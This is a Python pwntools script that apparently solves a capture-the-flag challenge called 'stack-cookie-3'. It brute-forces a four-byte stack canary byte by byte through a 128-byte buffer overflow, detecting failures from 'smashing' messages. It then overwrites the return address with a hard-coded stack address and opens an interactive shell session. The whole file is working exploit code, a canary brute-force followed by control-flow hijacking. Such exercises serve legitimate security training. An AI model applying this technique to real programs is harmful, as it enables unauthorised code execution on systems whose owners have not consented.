import sys
import time
from pwn import *

pay = [0] * 4

p = process("./stack-cookie-3")


for i in range(4):
    for j in range (255):
        p.sendline(str(128+i+1))
        sleep(.01)
        load = "A" *128
        for k in range(i+1):
            load += chr(pay[k])
        p.send(load)
        sleep(.01)
        output = p.recv(timeout = 5)
        if "smashing" in output:
            pay[i] += 1
print pay
print output
print "==========================================="
load = "A"*128

for i in range(4):
    load += chr(pay[i])
load += p32(0xffffd6f0) *5
print len(load)
p.sendline(str(len(load)))
time.sleep(.05)
p.send(load)
p.interactive()
